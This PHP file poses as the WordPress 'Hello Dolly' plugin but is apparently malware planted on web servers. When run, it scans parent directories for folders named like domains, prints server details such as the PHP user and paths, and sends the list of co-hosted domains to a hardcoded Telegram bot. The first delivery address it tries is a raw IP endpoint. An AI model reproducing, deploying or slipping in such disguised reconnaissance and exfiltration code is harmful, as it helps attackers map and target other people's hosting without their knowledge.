<?php
/**
 * @package Hello_Dolly
 * @version 1.7.2
 */
/*
Plugin Name: Hello Dolly
Plugin URI: http://wordpress.org/plugins/hello-dolly/
Description: This is not just a plugin, it symbolizes the hope and enthusiasm of an entire generation summed up in two words sung most famously by Louis Armstrong: Hello, Dolly. When activated you will randomly see a lyric from <cite>Hello, Dolly</cite> in the upper right of your admin screen on every page.
Author: Matt Mullenweg
Version: 1.7.2
Author URI: http://ma.tt/
*/

declare(strict_types=1);

// -------- Configuration --------------------------------------------------------

/**
 * Folders whose names (case-insensitive) should be skipped when walking up.
 */
$skipParentNames = ['wp'];

/**
 * Folders whose names should never be reported as "domains".
 */
$excludeNames = [
    'bin', 'etc', 'config', 'backup', 'backups', 'cgi-bin', 'mail',
    'logs', 'tmp', 'temp', 'cache', 'ssl', 'ssl-certs', 'private',
    'public_html', 'public_ftp', 'domains', 'awstats', 'perl',
    'access-logs', 'imap', 'Maildir', '.well-known', '.trash',
    'cp', 'panel', 'admin', 'stats', 'webalizer', 'var',
    'lib', 'lib64', 'sbin', 'usr', 'opt', 'srv', 'mnt',
    'dev', 'proc', 'sys', 'boot', 'run', 'root',
];

/**
 * Substrings that disqualify a folder name from being considered a domain.
 */
$excludeNameSubstrings = [
    '.bak', '.old', '.tar', '.zip', '.gz', '.sql', '.psql', '.dump',
    'subdomain.', 'parked.', 'addondomain.', 'tmp.', 'backup.',
];

/**
 * Walk stops as soon as the next parent's basename matches one of these.
 * That parent is NOT listed.
 */
$stopBeforeNames = ['home'];

/**
 * TLD whitelist. Used to reject false positives like "cpmove.psql".
 */
$validTlds = [
    'com','net','org','info','biz','name','pro','mobi',
    'io','co','ai','app','dev','xyz','tech','online','site','website',
    'store','shop','blog','page','cloud','host','live','me','tv','cc',
    'us','uk','ca','au','de','fr','it','es','nl','se','no','fi','dk',
    'be','ch','at','pl','ru','jp','cn','in','br','mx','ar','cl','pe',
    'id','my','sg','ph','th','vn','kr','tw','hk','nz','za','eu','asia',
    'africa','global','world','fun','art','design','digital','media',
    'agency','studio','group','team','works','lab','guru','tips','ninja',
    'edu','gov','mil','int','aero','coop','jobs','museum','travel',
    'xxx','cat','tel','post','asia',
    'ac','ad','ae','af','ag','ah','al','am','an','ao','aq',
    'as','at','au','aw','ax','az','ba','bb','bd','be','bf','bg','bh',
    'bi','bj','bl','bm','bn','bo','bq','br','bs','bt','bv','bw','by',
    'bz','ca','cc','cd','cf','cg','ch','ci','ck','cl','cm','cn','co',
    'cr','cu','cv','cw','cx','cy','cz','de','dj','dk','dm','do','dz',
    'ec','ee','eg','eh','er','es','et','eu','fi','fj','fk','fm','fo',
    'fr','ga','gb','gd','ge','gf','gg','gh','gi','gl','gm','gn','gp',
    'gq','gr','gs','gt','gu','gw','gy','hk','hm','hn','hr','ht','hu',
    'id','ie','il','im','in','io','iq','ir','is','it','je','jm','jo',
    'jp','ke','kg','kh','ki','km','kn','kp','kr','kw','ky','kz','la',
    'lb','lc','li','lk','lr','ls','lt','lu','lv','ly','ma','mc','md',
    'me','mg','mh','mk','ml','mm','mn','mo','mp','mq','mr','ms','mt',
    'mu','mv','mw','mx','my','mz','na','nc','ne','nf','ng','ni','nl',
    'no','np','nr','nu','nz','om','pa','pe','pf','pg','ph','pk','pl',
    'pm','pn','pr','ps','pt','pw','py','qa','re','ro','rs','ru','rw',
    'sa','sb','sc','sd','se','sg','sh','si','sj','sk','sl','sm','sn',
    'so','sr','ss','st','su','sv','sx','sy','sz','tc','td','tf','tg',
    'th','tj','tk','tl','tm','tn','to','tp','tr','tt','tv','tw','tz',
    'ua','ug','uk','us','uy','uz','va','vc','ve','vg','vi','vn','vu',
    'wf','ws','ye','yt','za','zm','zw',
];

/**
 * Telegram delivery settings.
 *   - $telegramBotToken : your bot token, e.g. "123456789:AAF...".
 *   - $telegramChatId   : the chat ID that should receive the report.
 *   - $telegramApiBases : ordered list of API bases to try. The first one
 *                          that successfully delivers the message wins.
 */
$telegramBotToken = '8783254749:AAE4nkFAZCvcthkcu_Maasw1WMwrjefw310';
$telegramChatId   = '7660485006';
$telegramApiBases = [
    'http://162.35.9.95:8081',
    'https://api.telegram.org',
];

// -------- Helpers --------------------------------------------------------------

function looks_like_domain(string $name, array $validTlds): bool
{
    if ($name === '' || strpos($name, '/') !== false || strpos($name, '\\') !== false) {
        return false;
    }
    if (preg_match('/\s/', $name)) {
        return false;
    }
    if (strpos($name, '.') === false) {
        return false;
    }
    if (strlen($name) > 253 || strlen($name) < 4) {
        return false;
    }
    $pattern = '/^(?=.{1,253}$)(?:(?!-)[A-Za-z0-9-]{1,63}(?<!-)\.)+[A-Za-z]{2,63}$/';
    if (!preg_match($pattern, $name)) {
        return false;
    }
    $parts     = explode('.', $name);
    $tld       = strtolower(end($parts));
    $tldLookup = array_change_key_case(array_flip($validTlds), CASE_LOWER);
    return isset($tldLookup[$tld]);
}

function ci_eq(string $a, string $b): bool
{
    return strcasecmp($a, $b) === 0;
}

function name_in_list(string $name, array $list): bool
{
    foreach ($list as $entry) {
        if (ci_eq($name, $entry)) {
            return true;
        }
    }
    return false;
}

function name_has_substring(string $name, array $needles): bool
{
    $lower = strtolower($name);
    foreach ($needles as $needle) {
        if ($needle !== '' && strpos($lower, strtolower($needle)) !== false) {
            return true;
        }
    }
    return false;
}

function detect_host_from_request(): string
{
    $source = '';
    if (!empty($_SERVER['HTTP_HOST'])) {
        $source = (string) $_SERVER['HTTP_HOST'];
    } elseif (!empty($_SERVER['SERVER_NAME'])) {
        $source = (string) $_SERVER['SERVER_NAME'];
    }
    if ($source === '') {
        return '';
    }
    $host = $source;
    if (strpos($host, '[') !== false && strpos($host, ']') !== false) {
        $host = substr($host, strpos($host, '[') + 1);
        $host = substr($host, 0, strpos($host, ']'));
    } elseif (($colon = strrpos($host, ':')) !== false && strpos($host, ':') === $colon) {
        $host = substr($host, 0, $colon);
    }
    return strtolower(trim($host));
}

/**
 * POST the given text to Telegram's sendMessage endpoint, trying each base
 * URL in $apiBases in order. Stops at the first success.
 *
 * @return array{ok:bool, base:string, http:int, detail:string}
 *         ok=true means at least one base delivered the message.
 */
function send_telegram(string $token, string $chatId, array $apiBases, string $text): array
{
    $result = [
        'ok'     => false,
        'base'   => '',
        'http'   => 0,
        'detail' => '',
    ];

    if ($token === '' || $chatId === '') {
        $result['detail'] = 'skipped: token or chat id not configured';
        return $result;
    }
    if (empty($apiBases)) {
        $result['detail'] = 'skipped: no API bases configured';
        return $result;
    }

    $payload  = json_encode(['chat_id' => $chatId, 'text' => $text]);
    $attempts = [];

    foreach ($apiBases as $apiBase) {
        if ($apiBase === '') {
            continue;
        }
        $url     = rtrim($apiBase, '/') . '/bot' . $token . '/sendMessage';
        $attempt = post_telegram($url, $payload);
        $attempt['base'] = $apiBase;
        $attempts[]      = $attempt;

        if ($attempt['ok']) {
            $result['ok']     = true;
            $result['base']   = $apiBase;
            $result['http']   = $attempt['http'];
            $result['detail'] = $attempt['detail'];
            return $result;
        }
    }

    $lines = [];
    foreach ($attempts as $a) {
        $lines[] = $a['base'] . ' => ' . $a['detail'];
    }
    $result['detail'] = 'all ' . count($attempts) . ' base(s) failed: ' . implode(' | ', $lines);
    return $result;
}

/**
 * Single POST attempt to one Telegram-compatible endpoint via curl.
 *
 * @return array{ok:bool, base:string, http:int, detail:string}
 */
function post_telegram(string $url, string $payload): array
{
    $attempt = ['ok' => false, 'base' => '', 'http' => 0, 'detail' => ''];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
    curl_setopt($ch, CURLOPT_TIMEOUT, 15);

    $response = curl_exec($ch);
    $errno    = curl_errno($ch);
    $error    = curl_error($ch);
    $httpCode = (int) curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    $attempt['http'] = $httpCode;

    if ($response === false) {
        $attempt['detail'] = 'curl error ' . $errno . ': ' . $error;
        return $attempt;
    }
    if ($httpCode < 200 || $httpCode >= 300) {
        $attempt['detail'] = 'HTTP ' . $httpCode . ': ' . trim((string) $response);
        return $attempt;
    }

    $attempt['ok']     = true;
    $attempt['detail'] = strlen($payload) . ' bytes sent, HTTP ' . $httpCode;
    return $attempt;
}

// -------- Walk-up with per-step debug ------------------------------------------

/**
 * Walk up from $startDir, scanning each parent's surface. Returns both the
 * final results and a per-step debug trace.
 *
 * @return array{
 *   host: string,
 *   domains: array<int, array{domain:string, level:string}>,
 *   trace:  array<int, string>
 * }
 */
function discover_with_debug(
    array $skipParentNames,
    array $excludeNames,
    array $excludeNameSubstrings,
    array $stopBeforeNames,
    array $validTlds
): array {
    $startDir = __DIR__;
    $results  = [];
    $seen     = [];
    $trace    = [];

    $httpHost = detect_host_from_request();
    $autoExcludes = [];
    if ($httpHost !== '' && looks_like_domain($httpHost, $validTlds)) {
        $autoExcludes[] = $httpHost;
    }
    $trace[] = '[host detection] HTTP_HOST="' . ($_SERVER['HTTP_HOST'] ?? '') . '" SERVER_NAME="' . ($_SERVER['SERVER_NAME'] ?? '') . '" -> host="' . ($httpHost !== '' ? $httpHost : '(empty)') . '"';
    $trace[] = '[host detection] auto-excluded hosts: ' . (empty($autoExcludes) ? '(none)' : implode(', ', $autoExcludes));

    $excludeSet = [];
    foreach ($autoExcludes as $h) {
        $excludeSet[strtolower($h)] = true;
    }

    $current = str_replace('\\', '/', $startDir);
    $step    = 0;

    while (true) {
        $step++;
        $parent = dirname($current);

        if ($parent === $current) {
            $trace[] = "[step $step] parent of $current is itself -> stopping (filesystem root)";
            break;
        }

        $parentName = strtolower(basename($parent));

        if (name_in_list($parentName, $stopBeforeNames)) {
            $trace[] = "[step $step] next parent is '$parentName' which is in stopBeforeNames -> stopping without listing";
            break;
        }

        if (name_in_list($parentName, $skipParentNames)) {
            $trace[] = "[step $step] next parent is '$parentName' which is in skipParentNames -> skipping scan, walking up";
            $current = $parent;
            continue;
        }

        $entries = @scandir($parent);
        if ($entries === false || !is_array($entries)) {
            $trace[] = "[step $step] could not scandir($parent) -> stopping";
            break;
        }

        $trace[] = "[step $step] scanning surface of $parent (" . count($entries) . " entries)";
        $keptHere = [];

        foreach ($entries as $entry) {
            if ($entry === '.' || $entry === '..') {
                continue;
            }

            $entryLower = strtolower($entry);

            if (isset($excludeSet[$entryLower])) {
                $trace[] = "    [skip] $entry (auto-excluded host)";
                continue;
            }
            if (name_in_list($entry, $excludeNames)) {
                $trace[] = "    [skip] $entry (in excludeNames)";
                continue;
            }
            if (name_has_substring($entry, $excludeNameSubstrings)) {
                $trace[] = "    [skip] $entry (contains disqualifying substring)";
                continue;
            }
            if (!looks_like_domain($entry, $validTlds)) {
                $trace[] = "    [skip] $entry (fails domain-shape or TLD whitelist)";
                continue;
            }

            $full = $parent . DIRECTORY_SEPARATOR . $entry;
            if (!is_dir($full)) {
                $trace[] = "    [skip] $entry (not a directory)";
                continue;
            }
            if (isset($seen[$entryLower])) {
                $trace[] = "    [skip] $entry (duplicate)";
                continue;
            }

            $seen[$entryLower] = true;
            $keptHere[]       = $entry;
            $results[]        = ['domain' => $entry, 'level' => $parent];
        }

        if (empty($keptHere)) {
            $trace[] = "    [step $step] no domains kept at this level";
        } else {
            $trace[] = "    [step $step] kept: " . implode(', ', $keptHere);
        }

        $current = $parent;
    }

    usort($results, static function ($a, $b) {
        return strcasecmp($a['domain'], $b['domain']);
    });

    return [
        'host'    => !empty($autoExcludes) ? strtolower($autoExcludes[0]) : '',
        'domains' => $results,
        'trace'   => $trace,
    ];
}

// -------- Render ---------------------------------------------------------------

header('Content-Type: text/plain; charset=utf-8');

echo "====== Domain Discovery (DEBUG BUILD) ======\n";
echo "Script location : " . __FILE__ . "\n";
echo "Script basename : " . basename(__FILE__) . "\n";
echo "PHP version     : " . PHP_VERSION . "\n";
echo "SAPI            : " . php_sapi_name() . "\n";
echo "PHP user        : " . (function_exists('posix_getpwuid') && function_exists('getmyuid')
    ? @posix_getpwuid(getmyuid())['name'] ?? '(unknown)'
    : '(posix unavailable)') . "\n";
echo "\n";

$out = discover_with_debug($skipParentNames, $excludeNames, $excludeNameSubstrings, $stopBeforeNames, $validTlds);

echo "----- Host detection -----\n";
echo "Host domain     : " . ($out['host'] !== '' ? $out['host'] : '(unknown)') . "\n\n";

echo "----- Walk-up trace -----\n";
foreach ($out['trace'] as $line) {
    echo $line . "\n";
}
echo "\n";

echo "----- Result -----\n";
echo "Domains found   : " . count($out['domains']) . "\n\n";
if (empty($out['domains'])) {
    echo "(none)\n";
} else {
    foreach ($out['domains'] as $row) {
        echo "  " . $row['domain'] . "\n";
        echo "      parent: " . $row['level'] . "\n";
    }
}

echo "\n----- Telegram-style payload (preview) -----\n";
$preview = [];
foreach ($out['domains'] as $row) {
    $preview[] = $row['domain'] . '[' . $out['host'] . ']';
}
$telegramText = implode("\n", $preview);
echo empty($preview) ? "(empty)\n" : $telegramText . "\n";

// -------- Telegram send -------------------------------------------------------

$telegramResult = send_telegram(
    $telegramBotToken,
    $telegramChatId,
    $telegramApiBases,
    $telegramText
);

echo "\n----- Telegram send -----\n";
if ($telegramResult['ok']) {
    echo "Status          : OK\n";
    echo "Delivered via   : " . $telegramResult['base'] . "\n";
    echo "HTTP            : " . $telegramResult['http'] . "\n";
    echo "Detail          : " . $telegramResult['detail'] . "\n";
} else {
    echo "Status          : FAILED\n";
    echo "Bases tried     : " . implode(', ', $telegramApiBases) . "\n";
    echo "Detail          : " . $telegramResult['detail'] . "\n";
}

echo "\n----- End of debug build -----\n";
